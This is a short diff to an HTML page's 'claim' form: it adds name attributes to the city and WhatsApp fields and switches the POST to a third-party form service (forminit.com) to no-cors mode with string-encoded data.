@@ -315,7 +315,7 @@ h1{font-family:'Bebas Neue',sans-serif;
 
     <div class="field">
       <label>Your US City</label>
-      <select id="cityInput">
+      <select id="cityInput" name="city">
         <option value="" disabled selected>Select city...</option>
         <option>Jersey City</option><option>Sunnyvale</option><option>Fremont</option>
         <option>Sugar Land</option><option>Edison</option><option>Cupertino</option>
@@ -331,7 +331,7 @@ h1{font-family:'Bebas Neue',sans-serif;
       <label>WhatsApp (US)</label>
       <div class="pfx">
         <span>+1</span>
-        <input type="tel" id="phoneInput" placeholder="(555) 000-0000" maxlength="14">
+        <input type="tel" id="phoneInput" name="whatsno" placeholder="(555) 000-0000" maxlength="14">
       </div>
     </div>
 
@@ -433,8 +433,9 @@ function handleClaim(){
 
   fetch('https://forminit.com/f/pnng9u79qsk', {
     method: 'POST',
+    mode: 'no-cors',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: formData
+    body: formData.toString()
   }).catch(err => console.error('Form Submission Error:', err));
 
   document.getElementById('overlay').classList.add('on');
